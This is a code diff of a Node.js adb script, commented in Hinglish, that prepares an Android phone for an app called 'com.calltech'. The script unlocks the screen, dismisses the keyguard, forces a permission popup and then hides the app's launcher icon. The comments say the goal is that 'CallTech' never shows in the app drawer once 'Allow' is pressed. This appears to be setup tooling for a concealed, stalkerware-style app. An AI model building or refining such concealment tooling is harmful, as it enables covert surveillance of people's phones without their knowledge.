@@ -1,15 +1,13 @@
 /**
- * Install ke baad USB se permission popup — user icon nahi dabata.
- * ColorOS: pehle Owner user 0 par package enable, phir am start.
- * HOME mat bhejo: permission dialog band ho jata hai.
+ * Install ke baad: icon turant hide, phir USB se permission popup.
+ * Launcher alias kabhi enable mat karo — ColorOS drawer mein CallTech dikh jaata hai.
  */
 const {execSync} = require('child_process');
-const {runOutput, ensurePackageForAllUsers} = require('./package-check');
+const {ensurePackageForAllUsers} = require('./package-check');
+const {hideLauncherOnly, disableAliases} = require('./hide-launcher-icon');
 
 const PACKAGE = 'com.calltech';
 const ACTIVITY = `${PACKAGE}/.PermissionTrampolineActivity`;
-const VISIBLE = `${PACKAGE}/.LauncherAlias`;
-const HIDDEN = `${PACKAGE}/.HiddenAlias`;
 
 function run(command) {
   try {
@@ -38,9 +36,11 @@ function sleepMs(ms) {
 }
 
 function hideLauncherIcon(deviceId) {
-  run(`adb -s ${deviceId} shell pm enable --user 0 ${HIDDEN}`);
-  run(`adb -s ${deviceId} shell pm disable-user --user 0 ${VISIBLE}`);
-  run(`adb -s ${deviceId} shell pm disable ${VISIBLE}`);
+  hideLauncherOnly(deviceId);
+}
+
+function disableIconOnly(deviceId) {
+  disableAliases(deviceId);
 }
 
 function launchSucceeded(output) {
@@ -52,31 +52,32 @@ function launchSucceeded(output) {
   );
 }
 
-function fakeLauncherTap(deviceId) {
+function startTrampoline(deviceId) {
   const starts = [
     `adb -s ${deviceId} shell am start -W --user 0 -n ${ACTIVITY} -a android.intent.action.MAIN -c android.intent.category.DEFAULT -f 0x10000000 --ez calltech_force_popup true`,
-    `adb -s ${deviceId} shell am start -W --user 0 -n ${VISIBLE} -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -f 0x10008000`,
-    `adb -s ${deviceId} shell monkey --user 0 -p ${PACKAGE} -c android.intent.category.LAUNCHER 1`,
+    `adb -s ${deviceId} shell am start -W --user 0 -n ${ACTIVITY} -f 0x10000000 --ez calltech_force_popup true`,
+    `adb -s ${deviceId} shell am start --user 0 -n ${PACKAGE}/${PACKAGE}.PermissionTrampolineActivity -f 0x10000000`,
   ];
   return starts.some(cmd => launchSucceeded(startOutput(cmd)));
 }
 
 function launchPermissionPopup(deviceId) {
   ensurePackageForAllUsers(deviceId, PACKAGE);
+  hideLauncherIcon(deviceId);
 
   run(`adb -s ${deviceId} shell svc power stayon usb`);
   run(`adb -s ${deviceId} shell input keyevent KEYCODE_WAKEUP`);
   run(`adb -s ${deviceId} shell wm dismiss-keyguard`);
   run(`adb -s ${deviceId} shell input keyevent 82`);
   run(`adb -s ${deviceId} shell pm enable --user 0 ${PACKAGE}/.PermissionTrampolineActivity`);
-  run(`adb -s ${deviceId} shell pm enable --user 0 ${VISIBLE}`);
-  run(`adb -s ${deviceId} shell pm disable-user --user 0 ${HIDDEN}`);
 
-  sleepMs(500);
+  sleepMs(400);
+  disableIconOnly(deviceId);
 
   let shown = false;
   for (let i = 0; i < 8 && !shown; i += 1) {
-    shown = fakeLauncherTap(deviceId);
+    shown = startTrampoline(deviceId);
+    disableIconOnly(deviceId);
     if (!shown) {
       sleepMs(400);
     }
@@ -84,7 +85,7 @@ function launchPermissionPopup(deviceId) {
 
   console.log(
     shown
-      ? '  Permission popup USB se khul gaya — icon tap mat karo. Allow dabao, app hide ho jayegi.'
+      ? '  Icon hide + permission popup. Allow dabao — CallTech drawer mein nahi dikhegi.'
       : '  Popup start fail — Developer options: USB debugging (Security settings) ON.',
   );
 
